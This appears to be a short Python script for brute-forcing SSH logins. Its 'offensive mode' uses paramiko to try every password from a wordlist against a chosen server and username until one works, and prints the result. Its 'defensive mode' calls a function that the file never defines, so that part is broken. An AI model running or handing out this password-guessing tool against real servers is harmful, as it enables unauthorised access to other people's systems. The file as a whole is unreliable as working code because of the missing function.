import paramiko
import time

def ssh_connect(username, ip, password):
    # Initialize SSH client
    client = paramiko.SSHClient()
    # Automatically add host key (not recommended for production use)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # Attempt to connect to the SSH server
        client.connect(ip, username=username, password=password, timeout=3)
        return True
    except paramiko.AuthenticationException:
        # Authentication failed, return False
        return False
    except Exception as e:
        # Handle other exceptions such as connection errors
        print(f"Connection failed: {e}")
        return False
    finally:
        # Ensure the connection is closed
        client.close()

def offensive_mode(wordlist_path, username, ip):
    # Try to open the wordlist file
    try:
        with open(wordlist_path, 'r') as file:
            # Iterate through each word in the file
            for word in file:
                word = word.strip()
                print(f"Trying password: {word}")
                # Check if the password works
                if ssh_connect(username, ip, word):
                    print(f"Success! Password is: {word}")
                    return
                # Delay between attempts to avoid overwhelming the server
                time.sleep(1) 
            print("Password not found.")
    except FileNotFoundError:
        # File was not found; prompt user to check the file path
        print("File not found. Please check the file path.")

def main():
    # User chooses the mode of operation
    mode = input("Choose mode (1 for Offensive, 2 for Defensive): ")
    # User provides the path to the wordlist file
    wordlist_path = input("Enter word list file path: ")

    if mode == '1':
        # In offensive mode, user must provide SSH credentials
        username = input("Enter SSH username: ")
        ip = input("Enter SSH server IP: ")
        offensive_mode(wordlist_path, username, ip)
    elif mode == '2':
        password = input("Enter the password to check: ")
        defensive_mode(password, wordlist_path)
    else:
        print("Invalid mode selected.")

if __name__ == "__main__":
    main()
